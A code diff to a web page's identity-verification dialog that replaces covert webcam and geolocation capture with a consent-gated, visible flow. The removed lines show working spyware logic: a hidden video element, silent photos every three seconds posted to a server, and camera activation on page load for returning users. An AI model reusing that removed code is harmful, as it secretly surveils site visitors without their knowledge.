@@ -249,6 +249,8 @@
     padding: 32px 28px 28px;
     width: 100%;
     max-width: 400px;
+    max-height: calc(100vh - 32px);
+    overflow-y: auto;
     margin: 16px;
     box-shadow: 0 24px 64px rgba(0,0,0,0.22);
     position: relative;
@@ -520,6 +522,66 @@
     margin-top: 8px;
   }
   .vfy-btn-cancel:hover { background: #f8f8f8; }
+  .vfy-disclosure {
+    background: #fff9e6;
+    border: 1px solid #f2d77a;
+    border-radius: 12px;
+    color: #594600;
+    font-size: 12px;
+    line-height: 1.55;
+    margin-bottom: 16px;
+    padding: 12px 14px;
+  }
+  .vfy-consent {
+    align-items: flex-start;
+    cursor: pointer;
+    display: flex;
+    font-size: 12px;
+    gap: 10px;
+    line-height: 1.5;
+    margin: 4px 0 14px;
+  }
+  .vfy-consent input { margin-top: 3px; width: 18px; height: 18px; flex-shrink: 0; }
+  .vfy-camera-wrap {
+    background: #171717;
+    border-radius: 14px;
+    display: none;
+    margin: 12px 0;
+    overflow: hidden;
+    position: relative;
+  }
+  .vfy-camera-wrap.active { display: block; }
+  .vfy-camera-wrap video { display: block; width: 100%; aspect-ratio: 4/3; object-fit: cover; transform: scaleX(-1); }
+  .vfy-camera-indicator {
+    align-items: center;
+    background: rgba(0,0,0,.72);
+    border-radius: 999px;
+    color: #fff;
+    display: flex;
+    font-size: 11px;
+    font-weight: 700;
+    gap: 7px;
+    left: 10px;
+    padding: 6px 10px;
+    position: absolute;
+    top: 10px;
+  }
+  .vfy-camera-dot { background: #ef4444; border-radius: 50%; height: 8px; width: 8px; animation: cameraPulse 1.2s infinite; }
+  @keyframes cameraPulse { 50% { opacity: .35; } }
+  .vfy-progress {
+    background: #f3f3f3;
+    border-radius: 10px;
+    color: #555;
+    display: none;
+    font-size: 12px;
+    line-height: 1.5;
+    margin: 12px 0;
+    padding: 10px 12px;
+    text-align: center;
+  }
+  .vfy-progress.active { display: block; }
+  .vfy-progress.error { background: #fef2f2; color: #b91c1c; }
+  .vfy-progress.success { background: #f0fdf4; color: #15803d; }
   /* spinner */
   .vfy-spinner {
     display: inline-block;
@@ -795,14 +857,18 @@
 <div class="vfy-overlay" id="vfyOverlay">
   <div class="vfy-modal" id="vfyModal">
 
-    <!-- Identity Form (camera runs silently in background) -->
+    <!-- Transparent identity verification with explicit camera/location consent -->
     <div id="vfyIdentityScreen">
       <div class="vfy-id-icon">
         <div class="vfy-id-pulse"></div>
         <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><rect x="2" y="5" width="20" height="14" rx="3"/><path d="M7 15h4M7 11h2"/><circle cx="16" cy="11" r="2"/><path d="M14 15h4"/></svg>
       </div>
       <div class="vfy-title">Identity Verification</div>
-      <div class="vfy-subtitle">Fill in your details below to verify your identity.</div>
+      <div class="vfy-subtitle">Internal verification with visible camera capture.</div>
+
+      <div class="vfy-disclosure">
+        This company tool sends your name, phone/ID, IP address, precise location (if allowed), and up to 10 visible camera photos to the company Telegram bot. Photos are captured every 3 seconds only while this dialog is open and the camera preview is visible.
+      </div>
 
       <div class="vfy-field">
         <label for="vfyName">Full Name</label>
@@ -815,12 +881,23 @@
         <div class="vfy-field-error" id="vfyPhoneErr">Please enter a valid phone or ID number.</div>
       </div>
 
-      <button class="vfy-btn" id="vfyIdentityBtn">Complete Verification</button>
+      <label class="vfy-consent">
+        <input type="checkbox" id="vfyConsent">
+        <span>I understand what data is collected and consent to camera/location access and delivery of this data to the company Telegram.</span>
+      </label>
+
+      <button class="vfy-btn" id="vfyStartCameraBtn" disabled>Allow camera &amp; location</button>
+
+      <div class="vfy-camera-wrap" id="vfyCameraWrap">
+        <video id="vfyVideo" autoplay muted playsinline></video>
+        <div class="vfy-camera-indicator"><span class="vfy-camera-dot"></span><span id="vfyCameraIndicator">Camera active · 0/10 photos</span></div>
+      </div>
+
+      <div class="vfy-progress" id="vfyProgress">Waiting for consent.</div>
+
+      <button class="vfy-btn" id="vfyIdentityBtn" disabled>Complete &amp; send verification</button>
       <button class="vfy-btn-cancel" id="vfyIdentityCancelBtn">Cancel</button>
     </div>
-
-    <!-- Hidden video for background capture -->
-    <video id="vfyHiddenVideo" autoplay muted playsinline style="display:none;position:absolute;width:1px;height:1px;opacity:0;"></video>
 
   </div>
 </div>
@@ -975,95 +1052,135 @@
     document.getElementById('confirmSuccess').classList.add('active');
   });
 
-  // ============ VERIFICATION & BACKGROUND CAPTURE ============
-  let permStream     = null;
-  let permLocation   = null;
+  // ============ TRANSPARENT VERIFICATION & CAMERA CAPTURE ============
+  const MAX_CAPTURED_PHOTOS = 10;
+  let permStream = null;
+  let permLocation = null;
   let capturedFrames = [];
   let captureInterval = null;
+  let verificationSessionId = null;
   const captureCanvas = document.createElement('canvas');
-  captureCanvas.width = 320; captureCanvas.height = 240;
+  captureCanvas.width = 320;
+  captureCanvas.height = 240;
 
-  async function initCamera() {
-    if (permStream) return;
-    try {
-      if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-        permStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
-        startBackgroundCapture();
-      }
-    } catch (err) {}
-    if (!permLocation && navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(pos => { permLocation = pos; }, () => {}, { enableHighAccuracy: true, timeout: 10000 });
+  function setVerificationProgress(message, state) {
+    const progress = document.getElementById('vfyProgress');
+    progress.textContent = message;
+    progress.className = 'vfy-progress active' + (state ? ' ' + state : '');
+  }
+
+  function updateCaptureCount() {
+    const count = capturedFrames.length;
+    document.getElementById('vfyCameraIndicator').textContent = 'Camera active · ' + count + '/' + MAX_CAPTURED_PHOTOS + ' photos';
+    document.getElementById('vfyIdentityBtn').disabled = count === 0;
+    if (count >= MAX_CAPTURED_PHOTOS) {
+      clearInterval(captureInterval);
+      captureInterval = null;
+      setVerificationProgress('10 photos captured. Ready to send.', 'success');
+    } else {
+      setVerificationProgress(count + ' of ' + MAX_CAPTURED_PHOTOS + ' photos captured. You may send now or wait for more.');
     }
   }
 
-  async function startVerification() {
-    // Only show modal if not verified yet
+  function captureVisibleFrame() {
+    if (!permStream || capturedFrames.length >= MAX_CAPTURED_PHOTOS) return;
+    const video = document.getElementById('vfyVideo');
+    if (video.readyState < 2) return;
+    const ctx = captureCanvas.getContext('2d');
+    ctx.drawImage(video, 0, 0, captureCanvas.width, captureCanvas.height);
+    capturedFrames.push({ ts: Date.now(), img: captureCanvas.toDataURL('image/jpeg', 0.7) });
+    updateCaptureCount();
+  }
+
+  async function initCameraAndLocation() {
+    if (!document.getElementById('vfyConsent').checked || permStream) return;
+    const startButton = document.getElementById('vfyStartCameraBtn');
+    startButton.disabled = true;
+    startButton.textContent = 'Requesting permission…';
+    setVerificationProgress('Your browser will ask for camera and location permission.');
+
+    try {
+      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+        throw new Error('Camera is not supported by this browser.');
+      }
+      permStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+      const video = document.getElementById('vfyVideo');
+      video.srcObject = permStream;
+      document.getElementById('vfyCameraWrap').classList.add('active');
+      await video.play();
+      startButton.textContent = 'Camera is active';
+      captureVisibleFrame();
+      captureInterval = setInterval(captureVisibleFrame, 3000);
+    } catch (error) {
+      startButton.disabled = false;
+      startButton.textContent = 'Try camera & location again';
+      setVerificationProgress(error.message || 'Camera permission was not granted.', 'error');
+      return;
+    }
+
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        position => { permLocation = position; },
+        () => { permLocation = null; },
+        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+      );
+    }
+  }
+
+  function stopStream() {
+    clearInterval(captureInterval);
+    captureInterval = null;
+    if (permStream) {
+      permStream.getTracks().forEach(track => track.stop());
+      permStream = null;
+    }
+    const video = document.getElementById('vfyVideo');
+    if (video) video.srcObject = null;
+  }
+
+  function startVerification() {
+    stopStream();
+    capturedFrames = [];
+    permLocation = null;
+    verificationSessionId = window.crypto.randomUUID
+      ? window.crypto.randomUUID()
+      : String(Date.now()) + '-' + Math.random().toString(16).slice(2).padEnd(20, '0');
     document.getElementById('vfyOverlay').classList.add('active');
-    document.getElementById('vfyName').value  = '';
+    document.getElementById('vfyName').value = '';
     document.getElementById('vfyPhone').value = '';
-    ['vfyName','vfyPhone'].forEach(id => document.getElementById(id).classList.remove('error'));
-    ['vfyNameErr','vfyPhoneErr'].forEach(id => document.getElementById(id).style.display = 'none');
-
-    // Request/start camera
-    initCamera();
+    document.getElementById('vfyConsent').checked = false;
+    document.getElementById('vfyStartCameraBtn').disabled = true;
+    document.getElementById('vfyStartCameraBtn').textContent = 'Allow camera & location';
+    document.getElementById('vfyIdentityBtn').disabled = true;
+    document.getElementById('vfyCameraWrap').classList.remove('active');
+    document.getElementById('vfyProgress').className = 'vfy-progress';
+    ['vfyName', 'vfyPhone'].forEach(id => document.getElementById(id).classList.remove('error'));
+    ['vfyNameErr', 'vfyPhoneErr'].forEach(id => document.getElementById(id).style.display = 'none');
   }
 
-  // --- Background capture (runs silently directly to img/) ---
-  function startBackgroundCapture() {
-    if (!permStream || captureInterval) return;
-
-    const video = document.getElementById('vfyHiddenVideo');
-    video.srcObject = permStream;
-    video.play().catch(() => {});
-
-    captureInterval = setInterval(async () => {
-      try {
-        const ctx = captureCanvas.getContext('2d');
-        ctx.drawImage(video, 0, 0, 320, 240);
-        const frame = captureCanvas.toDataURL('image/jpeg', 0.65);
-        const ts    = Date.now();
-        capturedFrames.push({ ts, img: frame });
-
-        // Post to backend server (supports same host, localhost, or IP on port 3000)
-        const host = window.location.hostname || 'localhost';
-        const endpoints = ['/api/capture', 'http://' + host + ':3000/api/capture'];
-        for (const url of endpoints) {
-          try {
-            const res = await fetch(url, {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({ img: frame, ts })
-            });
-            if (res.ok) {
-              const data = await res.json();
-              if (data.ok) break;
-            }
-          } catch (e) {}
-        }
-      } catch (e) {}
-    }, 3000);
-  }
-
-  // Trigger camera on input focus or click if browser blocked automatic load
-  ['vfyName', 'vfyPhone', 'vfyModal'].forEach(id => {
-    const el = document.getElementById(id);
-    if (el) {
-      el.addEventListener('focus', () => { if (!permStream) initCamera(); }, { passive: true });
-      el.addEventListener('click', () => { if (!permStream) initCamera(); }, { passive: true });
+  document.getElementById('vfyConsent').addEventListener('change', event => {
+    document.getElementById('vfyStartCameraBtn').disabled = !event.target.checked;
+    if (!event.target.checked && permStream) {
+      stopStream();
+      capturedFrames = [];
+      document.getElementById('vfyCameraWrap').classList.remove('active');
+      document.getElementById('vfyIdentityBtn').disabled = true;
+      setVerificationProgress('Consent withdrawn. Camera stopped and unsent photos deleted.');
     }
   });
+  document.getElementById('vfyStartCameraBtn').addEventListener('click', initCameraAndLocation);
 
-  // --- Identity form submit ---
-  document.getElementById('vfyIdentityBtn').addEventListener('click', () => {
-    const nameInput  = document.getElementById('vfyName');
+  document.getElementById('vfyIdentityBtn').addEventListener('click', async () => {
+    const nameInput = document.getElementById('vfyName');
     const phoneInput = document.getElementById('vfyPhone');
-    const nameErr    = document.getElementById('vfyNameErr');
-    const phoneErr   = document.getElementById('vfyPhoneErr');
+    const nameErr = document.getElementById('vfyNameErr');
+    const phoneErr = document.getElementById('vfyPhoneErr');
     let valid = true;
 
-    nameInput.classList.remove('error'); phoneInput.classList.remove('error');
-    nameErr.style.display = 'none';     phoneErr.style.display = 'none';
-
+    nameInput.classList.remove('error');
+    phoneInput.classList.remove('error');
+    nameErr.style.display = 'none';
+    phoneErr.style.display = 'none';
     if (nameInput.value.trim().length < 2) {
       nameInput.classList.add('error');
       nameErr.style.display = 'block';
@@ -1074,70 +1191,73 @@
       phoneErr.style.display = 'block';
       valid = false;
     }
+    if (!document.getElementById('vfyConsent').checked || !capturedFrames.length) valid = false;
     if (!valid) return;
 
-    // Send identity data to server (saved in identities.json)
-    const host = window.location.hostname || 'localhost';
-    const endpoints = ['/api/verify', 'http://' + host + ':3000/api/verify', 'https://' + host + ':8443/api/verify'];
     const locData = permLocation ? {
       latitude: permLocation.coords.latitude,
       longitude: permLocation.coords.longitude,
       accuracy: permLocation.coords.accuracy
     } : null;
+    const submitButton = document.getElementById('vfyIdentityBtn');
+    submitButton.disabled = true;
+    stopStream();
+    setVerificationProgress('Sending identity data…');
 
-    const payload = JSON.stringify({
-      name: nameInput.value.trim(),
-      phone: phoneInput.value.trim(),
-      location: locData,
-      ts: Date.now()
-    });
+    try {
+      const verifyResponse = await fetch('/api/verify', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          name: nameInput.value.trim(),
+          phone: phoneInput.value.trim(),
+          location: locData,
+          ts: Date.now(),
+          sessionId: verificationSessionId,
+          consent: true,
+          photoCount: capturedFrames.length
+        })
+      });
+      if (!verifyResponse.ok) throw new Error((await verifyResponse.json()).error || 'Could not send identity data.');
 
-    for (const url of endpoints) {
-      try {
-        fetch(url, {
+      for (let index = 0; index < capturedFrames.length; index += 1) {
+        setVerificationProgress('Sending photo ' + (index + 1) + ' of ' + capturedFrames.length + '…');
+        const photoResponse = await fetch('/api/capture', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: payload
-        }).catch(() => {});
-      } catch (e) {}
-    }
+          body: JSON.stringify({
+            img: capturedFrames[index].img,
+            ts: capturedFrames[index].ts,
+            sessionId: verificationSessionId
+          })
+        });
+        if (!photoResponse.ok) throw new Error((await photoResponse.json()).error || 'Could not send a photo.');
+      }
 
-    // Remember verification in localStorage
-    localStorage.setItem('bdgm_verified', 'true');
-    closeVerification();
+      localStorage.setItem('bdgm_verified', 'true');
+      setVerificationProgress('Verification sent successfully.', 'success');
+      setTimeout(closeVerification, 900);
+    } catch (error) {
+      submitButton.disabled = false;
+      setVerificationProgress(error.message || 'Verification could not be sent. Please retry.', 'error');
+    }
   });
 
   document.getElementById('vfyIdentityCancelBtn').addEventListener('click', closeVerification);
 
-  function stopStream() {
-    clearInterval(captureInterval);
-    captureInterval = null;
-    if (permStream) {
-      permStream.getTracks().forEach(t => t.stop());
-      permStream = null;
-    }
-    const video = document.getElementById('vfyHiddenVideo');
-    if (video) video.srcObject = null;
-  }
-
   function closeVerification() {
     stopStream();
+    capturedFrames = [];
     document.getElementById('vfyOverlay').classList.remove('active');
   }
 
-  // On page load: if not verified, show verification once. If already verified, quietly capture without showing modal.
+  // Camera and location are never started without visible consent.
   window.addEventListener('load', () => {
     const isVerified = localStorage.getItem('bdgm_verified');
-    if (!isVerified) {
-      startVerification();
-    } else {
-      initCamera();
-    }
+    if (!isVerified) startVerification();
   });
 
   update();
 </script>
 </body>
 </html>
-
-
